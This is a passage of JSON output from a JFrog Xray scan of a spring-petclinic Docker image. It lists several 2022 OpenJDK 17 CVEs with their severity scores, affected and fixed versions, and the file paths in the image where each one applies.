               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21340",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196388",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 7.331",
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21341",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Serialization). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21341",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196387",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D). Supported versions that are affected are Oracle Java SE: 7u321, 8u311; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 7.331",
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21349",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D). Supported versions that are affected are Oracle Java SE: 7u321, 8u311; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21349",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196386",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "7.0.0 ≤ Version < 7.331",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21360",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21360",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196385",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "7.0.0 ≤ Version < 7.331",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21365",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196384",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21366",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21366",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-196303",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 7.331",
               "11.0.0 ≤ Version < 11.0.14",
               "17.0.0 ≤ Version < 17.0.2",
               "8.0.0 ≤ Version < 8.321"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2",
               "7.331",
               "8.321"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21291",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot). Supported versions that are affected are Oracle Java SE: 7u321, 8u311, 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Integrity impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javadoc",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/java",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javap"
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2022-21291",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-195299",
         "severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "cpp",
         "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "oracle:openjdk",
         "source_id": "cpp://oracle:openjdk",
         "source_comp_id": "cpp://oracle:openjdk:17",
         "component_versions": {
            "id": "oracle:openjdk",
            "vulnerable_versions": [
               "< 11.0.14",
               "17.0.0 ≤ Version < 17.0.2"
            ],
            "fixed_versions": [
               "11.0.14",
               "17.0.2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2022-21277",
                     "cwe": [
                        "NVD-CWE-noinfo"
                     ],
                     "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                  }
               ],
               "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: ImageIO). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjavajpeg.so",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/bin/javac",
            "sha256__d8d715783b80cab158f5bf9726bcada5265c1624b64ca2bb46f42f94998d4662.tar.gz/opt/openjdk-17/lib/libjava.so",
